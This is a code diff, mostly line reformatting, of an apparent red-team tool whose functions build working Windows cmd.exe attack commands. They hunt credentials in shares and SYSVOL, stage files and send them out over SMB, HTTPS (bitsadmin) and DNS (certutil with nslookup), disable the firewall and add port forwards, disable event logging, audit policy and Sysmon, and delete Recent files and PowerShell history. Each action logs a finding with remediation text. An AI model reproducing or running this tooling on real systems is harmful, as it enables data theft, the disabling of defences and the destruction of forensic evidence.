@@ -9,7 +9,10 @@ export async function shareHunt(args: string[], timeout: number): Promise<HookRe
   const findings: Finding[] = []
   const output: string[] = ["[*] Network share hunting...\n"]
 
-  if ((activeExec === "cmd" || activeExec === "bat" || activeExec === "wmic") && (action === "enum" || action === "writable" || action === "hunt" || action === "sysvol")) {
+  if (
+    (activeExec === "cmd" || activeExec === "bat" || activeExec === "wmic") &&
+    (action === "enum" || action === "writable" || action === "hunt" || action === "sysvol")
+  ) {
     if (action === "enum" || action === "writable") {
       output.push("=== Share Enumeration (cmd.exe) ===\n")
       if (target === "domain") {
@@ -23,7 +26,11 @@ export async function shareHunt(args: string[], timeout: number): Promise<HookRe
           const shares = await cmd(`net view \\\\${host} 2>nul`, timeout)
           if (shares.exitCode === 0) {
             output.push(`\n[+] ${host}:`)
-            const shareLines = shares.stdout.split("\n").filter((l) => l.trim() && !l.includes("---") && !l.includes("Share name") && !l.includes("command completed"))
+            const shareLines = shares.stdout
+              .split("\n")
+              .filter(
+                (l) => l.trim() && !l.includes("---") && !l.includes("Share name") && !l.includes("command completed"),
+              )
             for (const sl of shareLines) output.push(`    ${sl.trim()}`)
           }
         }
@@ -43,7 +50,16 @@ export async function shareHunt(args: string[], timeout: number): Promise<HookRe
       const localShares = await cmd("net share", timeout)
       output.push("\n=== Local Shares ===")
       output.push(localShares.stdout.trim())
-      findings.push({ checkId: "WIN-SHARE-001", provider: "windows", severity: "info", status: "ENUMERATED", resource: `smb://${target}`, title: "Share enumeration via cmd.exe net view/share", details: "cmd.exe native share discovery", remediation: "Restrict share permissions." })
+      findings.push({
+        checkId: "WIN-SHARE-001",
+        provider: "windows",
+        severity: "info",
+        status: "ENUMERATED",
+        resource: `smb://${target}`,
+        title: "Share enumeration via cmd.exe net view/share",
+        details: "cmd.exe native share discovery",
+        remediation: "Restrict share permissions.",
+      })
     }
     if (action === "hunt") {
       output.push("=== Sensitive File Hunt (cmd.exe) ===\n")
@@ -62,7 +78,16 @@ export async function shareHunt(args: string[], timeout: number): Promise<HookRe
         output.push(`\n[!] Deployment XML files:`)
         for (const f of unattend.stdout.trim().split("\n").slice(0, 10)) output.push(`    ${f}`)
       }
-      findings.push({ checkId: "WIN-SHARE-003", provider: "windows", severity: "high", status: "ENUMERATED", resource: `smb://${target}/hunt`, title: "Sensitive file discovery via cmd.exe dir", details: "dir /s recursive search for credential files", remediation: "Remove sensitive files from accessible shares." })
+      findings.push({
+        checkId: "WIN-SHARE-003",
+        provider: "windows",
+        severity: "high",
+        status: "ENUMERATED",
+        resource: `smb://${target}/hunt`,
+        title: "Sensitive file discovery via cmd.exe dir",
+        details: "dir /s recursive search for credential files",
+        remediation: "Remove sensitive files from accessible shares.",
+      })
     }
     if (action === "sysvol") {
       output.push("=== SYSVOL Harvest (cmd.exe) ===\n")
@@ -74,17 +99,32 @@ export async function shareHunt(args: string[], timeout: number): Promise<HookRe
         output.push("[!] GPP XML files found (may contain cpassword):")
         for (const f of gppXml.stdout.trim().split("\n").slice(0, 20)) output.push(`    ${f}`)
       }
-      const scripts = await cmd(`dir /s /b "${sysvolPath}\\*.ps1" "${sysvolPath}\\*.bat" "${sysvolPath}\\*.cmd" "${sysvolPath}\\*.vbs" 2>nul`, timeout)
+      const scripts = await cmd(
+        `dir /s /b "${sysvolPath}\\*.ps1" "${sysvolPath}\\*.bat" "${sysvolPath}\\*.cmd" "${sysvolPath}\\*.vbs" 2>nul`,
+        timeout,
+      )
       if (scripts.stdout.trim()) {
         output.push(`\n[!] Login/logoff scripts:`)
         for (const f of scripts.stdout.trim().split("\n").slice(0, 20)) output.push(`    ${f}`)
       }
-      const credsInScripts = await cmd(`findstr /s /i "password credential net use runas" "${sysvolPath}\\*.*" 2>nul`, timeout)
+      const credsInScripts = await cmd(
+        `findstr /s /i "password credential net use runas" "${sysvolPath}\\*.*" 2>nul`,
+        timeout,
+      )
       if (credsInScripts.stdout.trim()) {
         output.push(`\n[!!!] Credential references in SYSVOL:`)
         for (const l of credsInScripts.stdout.trim().split("\n").slice(0, 15)) output.push(`    ${l.trim()}`)
       }
-      findings.push({ checkId: "WIN-SHARE-004", provider: "windows", severity: "high", status: "ENUMERATED", resource: `smb://${domainName}/SYSVOL`, title: "SYSVOL harvest via cmd.exe", details: "GPP XML, scripts, credential references", remediation: "Remove GPP passwords (KB2962486). Audit SYSVOL scripts." })
+      findings.push({
+        checkId: "WIN-SHARE-004",
+        provider: "windows",
+        severity: "high",
+        status: "ENUMERATED",
+        resource: `smb://${domainName}/SYSVOL`,
+        title: "SYSVOL harvest via cmd.exe",
+        details: "GPP XML, scripts, credential references",
+        remediation: "Remove GPP passwords (KB2962486). Audit SYSVOL scripts.",
+      })
     }
     return { output: output.join("\n"), findings }
   }
@@ -505,7 +545,16 @@ export async function dataExfil(args: string[], timeout: number): Promise<HookRe
           }
         }
       }
-      findings.push({ checkId: "WIN-EXFIL-001", provider: "windows", severity: "high", status: "DISCOVERED", resource: `file://${searchPath}`, title: "Sensitive file discovery via cmd.exe dir", details: "Recursive dir /s search for credential and config files", remediation: "Encrypt sensitive files. Use DLP." })
+      findings.push({
+        checkId: "WIN-EXFIL-001",
+        provider: "windows",
+        severity: "high",
+        status: "DISCOVERED",
+        resource: `file://${searchPath}`,
+        title: "Sensitive file discovery via cmd.exe dir",
+        details: "Recursive dir /s search for credential and config files",
+        remediation: "Encrypt sensitive files. Use DLP.",
+      })
     }
     if (action === "stage") {
       const searchPath = target || "C:\\Users"
@@ -518,16 +567,40 @@ export async function dataExfil(args: string[], timeout: number): Promise<HookRe
       }
       const compress = await cmd(`compact /c /s:"${stageDir}" 2>nul`, timeout)
       output.push("[+] Files staged and NTFS compressed")
-      const makecab = await cmd(`makecab /d CabinetName1=staged.cab /d DiskDirectoryTemplate="${stageDir}" /f nul 2>nul`, timeout)
+      const makecab = await cmd(
+        `makecab /d CabinetName1=staged.cab /d DiskDirectoryTemplate="${stageDir}" /f nul 2>nul`,
+        timeout,
+      )
       output.push("[*] For CAB compression: makecab /d CabinetName1=output.cab <filelist>")
       output.push(`[*] For Base64 encoding: certutil -encode "${stageDir}\\file" "${stageDir}\\file.b64"`)
-      findings.push({ checkId: "WIN-EXFIL-002", provider: "windows", severity: "high", status: "STAGED", resource: `file://${stageDir}`, title: "File staging via cmd.exe", details: `Staged to ${stageDir}`, remediation: "Monitor file copy operations to temp directories." })
+      findings.push({
+        checkId: "WIN-EXFIL-002",
+        provider: "windows",
+        severity: "high",
+        status: "STAGED",
+        resource: `file://${stageDir}`,
+        title: "File staging via cmd.exe",
+        details: `Staged to ${stageDir}`,
+        remediation: "Monitor file copy operations to temp directories.",
+      })
     }
     if (action === "smb" && share) {
       output.push(`=== SMB Exfil (cmd.exe) ===`)
-      const r = await cmd(`xcopy "${target}" "${share}\\" /s /e /y /q 2>nul || copy "${target}" "${share}\\" 2>nul`, timeout)
+      const r = await cmd(
+        `xcopy "${target}" "${share}\\" /s /e /y /q 2>nul || copy "${target}" "${share}\\" 2>nul`,
+        timeout,
+      )
       output.push(r.exitCode === 0 ? `[+] Copied to ${share}` : `[!] Copy failed: ${r.stderr}`)
-      findings.push({ checkId: "WIN-EXFIL-SMB", provider: "windows", severity: "high", status: "EXFILTRATED", resource: share, title: "SMB exfil via cmd.exe xcopy/copy", details: `${target} → ${share}`, remediation: "Monitor SMB write operations." })
+      findings.push({
+        checkId: "WIN-EXFIL-SMB",
+        provider: "windows",
+        severity: "high",
+        status: "EXFILTRATED",
+        resource: share,
+        title: "SMB exfil via cmd.exe xcopy/copy",
+        details: `${target} → ${share}`,
+        remediation: "Monitor SMB write operations.",
+      })
     }
     if (action === "https" && url) {
       output.push("=== HTTPS Exfil (cmd.exe) ===")
@@ -535,17 +608,44 @@ export async function dataExfil(args: string[], timeout: number): Promise<HookRe
       if (b64.exitCode === 0) {
         output.push("[+] Base64 encoded via certutil")
         output.push(`[*] Upload: certutil -urlcache -split -f "${url}" (for download) or use bitsadmin for upload`)
-        const bits = await cmd(`bitsadmin /create csupload && bitsadmin /addfile csupload "${target}" "${url}" && bitsadmin /setnotifycmdline csupload cmd.exe "/c del %TEMP%\\cs-b64.txt" && bitsadmin /resume csupload 2>nul`, timeout)
-        output.push(bits.exitCode === 0 ? "[+] BITS upload job created" : "[*] BITS upload requires server support — use certutil + manual transfer")
+        const bits = await cmd(
+          `bitsadmin /create csupload && bitsadmin /addfile csupload "${target}" "${url}" && bitsadmin /setnotifycmdline csupload cmd.exe "/c del %TEMP%\\cs-b64.txt" && bitsadmin /resume csupload 2>nul`,
+          timeout,
+        )
+        output.push(
+          bits.exitCode === 0
+            ? "[+] BITS upload job created"
+            : "[*] BITS upload requires server support — use certutil + manual transfer",
+        )
       }
-      findings.push({ checkId: "WIN-EXFIL-HTTPS", provider: "windows", severity: "high", status: "EXFILTRATED", resource: url, title: "HTTPS exfil via certutil/bitsadmin", details: `${target} → ${url}`, remediation: "Monitor certutil and bitsadmin usage." })
+      findings.push({
+        checkId: "WIN-EXFIL-HTTPS",
+        provider: "windows",
+        severity: "high",
+        status: "EXFILTRATED",
+        resource: url,
+        title: "HTTPS exfil via certutil/bitsadmin",
+        details: `${target} → ${url}`,
+        remediation: "Monitor certutil and bitsadmin usage.",
+      })
     }
     if (action === "dns" && domain) {
       output.push("=== DNS Exfil (cmd.exe) ===")
       output.push(`[*] DNS exfil target domain: ${domain}`)
       output.push("[*] cmd.exe DNS exfil uses certutil encode + nslookup queries")
-      output.push(`[*] Manual: certutil -encode "${target}" encoded.txt && for /f %i in (encoded.txt) do nslookup %i.${domain}`)
-      findings.push({ checkId: "WIN-EXFIL-DNS", provider: "windows", severity: "high", status: "GUIDANCE", resource: domain, title: "DNS exfil guidance for cmd.exe", details: "certutil encode + nslookup subdomain queries", remediation: "Monitor DNS query volume and entropy." })
+      output.push(
+        `[*] Manual: certutil -encode "${target}" encoded.txt && for /f %i in (encoded.txt) do nslookup %i.${domain}`,
+      )
+      findings.push({
+        checkId: "WIN-EXFIL-DNS",
+        provider: "windows",
+        severity: "high",
+        status: "GUIDANCE",
+        resource: domain,
+        title: "DNS exfil guidance for cmd.exe",
+        details: "certutil encode + nslookup subdomain queries",
+        remediation: "Monitor DNS query volume and entropy.",
+      })
     }
     if (action === "icmp" && listener) {
       output.push("=== ICMP Exfil (cmd.exe) ===")
@@ -949,44 +1049,114 @@ export async function firewallManage(args: string[], timeout: number): Promise<H
       const profiles = await cmd("netsh advfirewall show allprofiles", timeout)
       output.push(profiles.stdout.trim())
       const rules = await cmd("netsh advfirewall firewall show rule name=all dir=in", timeout)
-      const ruleLines = rules.stdout.split("\n").filter((l) => l.includes("Rule Name:") || l.includes("Enabled:") || l.includes("Action:") || l.includes("LocalPort:"))
+      const ruleLines = rules.stdout
+        .split("\n")
+        .filter(
+          (l) =>
+            l.includes("Rule Name:") || l.includes("Enabled:") || l.includes("Action:") || l.includes("LocalPort:"),
+        )
       output.push(`\n=== Inbound Rules (${ruleLines.filter((l) => l.includes("Rule Name:")).length} total) ===`)
       const csRules = rules.stdout.split("\n").filter((l) => l.includes("CyberStrike") || l.includes("cs-"))
       if (csRules.length > 0) {
         output.push("\n[!] CyberStrike rules found:")
         for (const r of csRules) output.push(`    ${r.trim()}`)
       }
-      findings.push({ checkId: "WIN-FW-001", provider: "windows", severity: "info", status: "ENUMERATED", resource: "firewall://profiles", title: "Firewall enumeration via netsh", details: profiles.stdout.substring(0, 500), remediation: "Ensure firewall is enabled on all profiles." })
+      findings.push({
+        checkId: "WIN-FW-001",
+        provider: "windows",
+        severity: "info",
+        status: "ENUMERATED",
+        resource: "firewall://profiles",
+        title: "Firewall enumeration via netsh",
+        details: profiles.stdout.substring(0, 500),
+        remediation: "Ensure firewall is enabled on all profiles.",
+      })
     }
     if (action === "disable") {
       const target = profile === "all" ? "allprofiles" : `${profile}profile`
       const r = await cmd(`netsh advfirewall set ${target} state off`, timeout)
       output.push(r.exitCode === 0 ? `[+] Firewall disabled: ${target}` : `[!] Failed: ${r.stderr}`)
-      findings.push({ checkId: "WIN-FW-002", provider: "windows", severity: "critical", status: "EXECUTED", resource: `firewall://${profile}`, title: `Firewall ${profile} disabled via netsh`, details: r.stdout, remediation: "Re-enable: netsh advfirewall set allprofiles state on" })
+      findings.push({
+        checkId: "WIN-FW-002",
+        provider: "windows",
+        severity: "critical",
+        status: "EXECUTED",
+        resource: `firewall://${profile}`,
+        title: `Firewall ${profile} disabled via netsh`,
+        details: r.stdout,
+        remediation: "Re-enable: netsh advfirewall set allprofiles state on",
+      })
     }
     if (action === "allow" && port) {
       const name = ruleName || `cs-allow-${port}-${protocol}`
-      const inbound = await cmd(`netsh advfirewall firewall add rule name="${name}-in" dir=in action=allow protocol=${protocol} localport=${port}`, timeout)
-      const outbound = await cmd(`netsh advfirewall firewall add rule name="${name}-out" dir=out action=allow protocol=${protocol} localport=${port}`, timeout)
-      output.push(inbound.exitCode === 0 ? `[+] Inbound rule created: ${name}-in (${protocol}/${port})` : `[!] Inbound failed: ${inbound.stderr}`)
-      output.push(outbound.exitCode === 0 ? `[+] Outbound rule created: ${name}-out (${protocol}/${port})` : `[!] Outbound failed: ${outbound.stderr}`)
-      findings.push({ checkId: "WIN-FW-003", provider: "windows", severity: "high", status: "EXECUTED", resource: `firewall://rule/${name}`, title: `Firewall allow rule for ${protocol}/${port}`, details: `${name} in/out`, remediation: `Remove: netsh advfirewall firewall delete rule name="${name}-in" && netsh advfirewall firewall delete rule name="${name}-out"` })
+      const inbound = await cmd(
+        `netsh advfirewall firewall add rule name="${name}-in" dir=in action=allow protocol=${protocol} localport=${port}`,
+        timeout,
+      )
+      const outbound = await cmd(
+        `netsh advfirewall firewall add rule name="${name}-out" dir=out action=allow protocol=${protocol} localport=${port}`,
+        timeout,
+      )
+      output.push(
+        inbound.exitCode === 0
+          ? `[+] Inbound rule created: ${name}-in (${protocol}/${port})`
+          : `[!] Inbound failed: ${inbound.stderr}`,
+      )
+      output.push(
+        outbound.exitCode === 0
+          ? `[+] Outbound rule created: ${name}-out (${protocol}/${port})`
+          : `[!] Outbound failed: ${outbound.stderr}`,
+      )
+      findings.push({
+        checkId: "WIN-FW-003",
+        provider: "windows",
+        severity: "high",
+        status: "EXECUTED",
+        resource: `firewall://rule/${name}`,
+        title: `Firewall allow rule for ${protocol}/${port}`,
+        details: `${name} in/out`,
+        remediation: `Remove: netsh advfirewall firewall delete rule name="${name}-in" && netsh advfirewall firewall delete rule name="${name}-out"`,
+      })
     }
     if (action === "forward" && port && address) {
-      const r = await cmd(`netsh interface portproxy add v4tov4 listenport=${port} listenaddress=0.0.0.0 connectport=${address.split(":")[1] || port} connectaddress=${address.split(":")[0]}`, timeout)
+      const r = await cmd(
+        `netsh interface portproxy add v4tov4 listenport=${port} listenaddress=0.0.0.0 connectport=${address.split(":")[1] || port} connectaddress=${address.split(":")[0]}`,
+        timeout,
+      )
       output.push(r.exitCode === 0 ? `[+] Port forward: 0.0.0.0:${port} → ${address}` : `[!] Failed: ${r.stderr}`)
       const show = await cmd("netsh interface portproxy show all", timeout)
       output.push("\n=== Active Port Proxies ===")
       output.push(show.stdout.trim())
-      findings.push({ checkId: "WIN-FW-004", provider: "windows", severity: "high", status: "EXECUTED", resource: `portproxy://${port}`, title: `Port forward ${port} → ${address}`, details: show.stdout.substring(0, 300), remediation: `Remove: netsh interface portproxy delete v4tov4 listenport=${port} listenaddress=0.0.0.0` })
+      findings.push({
+        checkId: "WIN-FW-004",
+        provider: "windows",
+        severity: "high",
+        status: "EXECUTED",
+        resource: `portproxy://${port}`,
+        title: `Port forward ${port} → ${address}`,
+        details: show.stdout.substring(0, 300),
+        remediation: `Remove: netsh interface portproxy delete v4tov4 listenport=${port} listenaddress=0.0.0.0`,
+      })
     }
     if (action === "restore") {
       await cmd("netsh advfirewall set allprofiles state on", timeout)
-      const delRules = await cmd('netsh advfirewall firewall delete rule name=all dir=in action=allow | findstr /i "cs- cyberstrike"', timeout)
+      const delRules = await cmd(
+        'netsh advfirewall firewall delete rule name=all dir=in action=allow | findstr /i "cs- cyberstrike"',
+        timeout,
+      )
       await cmd("netsh interface portproxy reset", timeout)
       output.push("[+] Firewall restored: all profiles enabled, portproxy reset")
       output.push("[*] Note: manually verify cs-* rules are removed")
-      findings.push({ checkId: "WIN-FW-005", provider: "windows", severity: "info", status: "RESTORED", resource: "firewall://all", title: "Firewall restored via netsh", details: "All profiles enabled, portproxy reset", remediation: "Verify no residual rules remain." })
+      findings.push({
+        checkId: "WIN-FW-005",
+        provider: "windows",
+        severity: "info",
+        status: "RESTORED",
+        resource: "firewall://all",
+        title: "Firewall restored via netsh",
+        details: "All profiles enabled, portproxy reset",
+        remediation: "Verify no residual rules remain.",
+      })
     }
     return { output: output.join("\n"), findings }
   }
@@ -1278,7 +1448,16 @@ export async function cleanupWin(_args: string[], timeout: number): Promise<Hook
     output.push(`\n[*] cmd.exe cleanup complete — ${cleaned} artifacts removed`)
     output.push("[*] Note: Defender exclusions require PowerShell to remove (Get-MpPreference)")
     output.push("[*] Note: Event log clearing generates Event ID 1102")
-    findings.push({ checkId: "WIN-CLEANUP-001", provider: "windows", severity: "info", status: "CLEANED", resource: "windows://cleanup", title: `Windows cleanup via cmd.exe: ${cleaned} artifacts`, details: "wevtutil, schtasks, del, netsh cleanup", remediation: "Verify logs are cleared." })
+    findings.push({
+      checkId: "WIN-CLEANUP-001",
+      provider: "windows",
+      severity: "info",
+      status: "CLEANED",
+      resource: "windows://cleanup",
+      title: `Windows cleanup via cmd.exe: ${cleaned} artifacts`,
+      details: "wevtutil, schtasks, del, netsh cleanup",
+      remediation: "Verify logs are cleared.",
+    })
     return { output: output.join("\n"), findings }
   }
 
@@ -1388,13 +1567,35 @@ export async function eventTamper(args: string[], timeout: number): Promise<Hook
       output.push(`[*] Available: wevtutil cl "${logName}" — but this generates Event ID 1102`)
       output.push("[*] Safer approach: resize log to force rollover")
       const resize = await cmd(`wevtutil sl "${logName}" /ms:1048576`, timeout)
-      output.push(resize.exitCode === 0 ? `[+] Resized ${logName} to 1MB (forces faster rollover)` : `[!] Resize failed: ${resize.stderr}`)
-      findings.push({ checkId: "WIN-TAMPER-001", provider: "windows", severity: "high", status: "EXECUTED", resource: `eventlog://${logName}`, title: `Event log resize for rollover: ${logName}`, details: "wevtutil sl — forces faster evidence rollover", remediation: "Monitor for log size changes." })
+      output.push(
+        resize.exitCode === 0
+          ? `[+] Resized ${logName} to 1MB (forces faster rollover)`
+          : `[!] Resize failed: ${resize.stderr}`,
+      )
+      findings.push({
+        checkId: "WIN-TAMPER-001",
+        provider: "windows",
+        severity: "high",
+        status: "EXECUTED",
+        resource: `eventlog://${logName}`,
+        title: `Event log resize for rollover: ${logName}`,
+        details: "wevtutil sl — forces faster evidence rollover",
+        remediation: "Monitor for log size changes.",
+      })
     }
     if (action === "disable-source") {
       const r = await cmd(`wevtutil sl "${logName}" /e:false 2>nul`, timeout)
       output.push(r.exitCode === 0 ? `[+] Disabled log channel: ${logName}` : `[!] Failed: ${r.stderr}`)
-      findings.push({ checkId: "WIN-TAMPER-002", provider: "windows", severity: "critical", status: "EXECUTED", resource: `eventlog://${logName}`, title: `Log channel disabled: ${logName}`, details: "wevtutil sl /e:false", remediation: `Re-enable: wevtutil sl "${logName}" /e:true` })
+      findings.push({
+        checkId: "WIN-TAMPER-002",
+        provider: "windows",
+        severity: "critical",
+        status: "EXECUTED",
+        resource: `eventlog://${logName}`,
+        title: `Log channel disabled: ${logName}`,
+        details: "wevtutil sl /e:false",
+        remediation: `Re-enable: wevtutil sl "${logName}" /e:true`,
+      })
     }
     if (action === "audit-policy") {
       output.push("=== Audit Policy Manipulation (cmd.exe) ===\n")
@@ -1402,23 +1603,50 @@ export async function eventTamper(args: string[], timeout: number): Promise<Hook
       output.push("[*] Current audit policy:")
       output.push(current.stdout.trim().split("\n").slice(0, 30).join("\n"))
       output.push("\n[*] To disable process tracking:")
-      output.push("    auditpol /set /subcategory:\"Process Creation\" /success:disable /failure:disable")
+      output.push('    auditpol /set /subcategory:"Process Creation" /success:disable /failure:disable')
       output.push("[*] To disable logon auditing:")
-      output.push("    auditpol /set /subcategory:\"Logon\" /success:disable /failure:disable")
-      findings.push({ checkId: "WIN-TAMPER-003", provider: "windows", severity: "high", status: "ENUMERATED", resource: "auditpol://all", title: "Audit policy enumerated for tampering guidance", details: "auditpol /get", remediation: "Monitor audit policy changes." })
+      output.push('    auditpol /set /subcategory:"Logon" /success:disable /failure:disable')
+      findings.push({
+        checkId: "WIN-TAMPER-003",
+        provider: "windows",
+        severity: "high",
+        status: "ENUMERATED",
+        resource: "auditpol://all",
+        title: "Audit policy enumerated for tampering guidance",
+        details: "auditpol /get",
+        remediation: "Monitor audit policy changes.",
+      })
     }
     if (action === "resize") {
       const size = argVal(args, "--size") || "1048576"
       const r = await cmd(`wevtutil sl "${logName}" /ms:${size}`, timeout)
       output.push(r.exitCode === 0 ? `[+] Resized ${logName} to ${parseInt(size) / 1024}KB` : `[!] Failed: ${r.stderr}`)
-      findings.push({ checkId: "WIN-TAMPER-004", provider: "windows", severity: "high", status: "EXECUTED", resource: `eventlog://${logName}`, title: `Log resized to ${parseInt(size) / 1024}KB`, details: "Smaller log = faster evidence rollover", remediation: "Restore default log sizes." })
+      findings.push({
+        checkId: "WIN-TAMPER-004",
+        provider: "windows",
+        severity: "high",
+        status: "EXECUTED",
+        resource: `eventlog://${logName}`,
+        title: `Log resized to ${parseInt(size) / 1024}KB`,
+        details: "Smaller log = faster evidence rollover",
+        remediation: "Restore default log sizes.",
+      })
     }
     if (action === "disable-sysmon") {
       const stop = await cmd("sc stop Sysmon64 2>nul || sc stop Sysmon 2>nul", timeout)
       output.push(stop.exitCode === 0 ? "[+] Sysmon service stopped" : "[*] Sysmon not found or access denied")
-      const unload = await cmd('fltmc unload SysmonDrv 2>nul', timeout)
+      const unload = await cmd("fltmc unload SysmonDrv 2>nul", timeout)
       output.push(unload.exitCode === 0 ? "[+] Sysmon driver unloaded" : "[*] Driver unload failed (may need admin)")
-      findings.push({ checkId: "WIN-TAMPER-005", provider: "windows", severity: "critical", status: "EXECUTED", resource: "sysmon://service", title: "Sysmon disabled via sc/fltmc", details: "sc stop + fltmc unload", remediation: "Restart: sc start Sysmon64" })
+      findings.push({
+        checkId: "WIN-TAMPER-005",
+        provider: "windows",
+        severity: "critical",
+        status: "EXECUTED",
+        resource: "sysmon://service",
+        title: "Sysmon disabled via sc/fltmc",
+        details: "sc stop + fltmc unload",
+        remediation: "Restart: sc start Sysmon64",
+      })
     }
     return { output: output.join("\n"), findings }
   }
@@ -1741,7 +1969,10 @@ export async function antiForensics(args: string[], timeout: number): Promise<Ho
       output.push("\n=== Amcache Cleanup (cmd.exe) ===")
       output.push("[!] Amcache.hve is locked by OS — cannot modify with cmd.exe alone")
       output.push("[*] Workaround: reg delete the Amcache InventoryApplicationFile entries:")
-      const amcache = await cmd('reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppModel\\StateRepository\\Cache\\Application" /s 2>nul | findstr /i "cyberstrike cs-"', timeout)
+      const amcache = await cmd(
+        'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppModel\\StateRepository\\Cache\\Application" /s 2>nul | findstr /i "cyberstrike cs-"',
+        timeout,
+      )
       if (amcache.stdout.trim()) {
         output.push("[!] CyberStrike references found in registry:")
         output.push(amcache.stdout.trim().split("\n").slice(0, 10).join("\n"))
@@ -1764,10 +1995,22 @@ export async function antiForensics(args: string[], timeout: number): Promise<Ho
       output.push("\n=== Recent Files ===")
       await cmd('del /q "%APPDATA%\\Microsoft\\Windows\\Recent\\*.*" 2>nul', timeout)
       output.push("[+] Cleared Recent folder")
-      await cmd('del /q "%APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt" 2>nul', timeout)
+      await cmd(
+        'del /q "%APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt" 2>nul',
+        timeout,
+      )
       output.push("[+] Cleared PowerShell history")
     }
-    findings.push({ checkId: "WIN-ANTIFORENSICS-001", provider: "windows", severity: "high", status: "EXECUTED", resource: "windows://antiforensics", title: `Anti-forensics via cmd.exe (${action})`, details: "wevtutil, fsutil, del operations", remediation: "Monitor for forensic artifact manipulation." })
+    findings.push({
+      checkId: "WIN-ANTIFORENSICS-001",
+      provider: "windows",
+      severity: "high",
+      status: "EXECUTED",
+      resource: "windows://antiforensics",
+      title: `Anti-forensics via cmd.exe (${action})`,
+      details: "wevtutil, fsutil, del operations",
+      remediation: "Monitor for forensic artifact manipulation.",
+    })
     return { output: output.join("\n"), findings }
   }
 
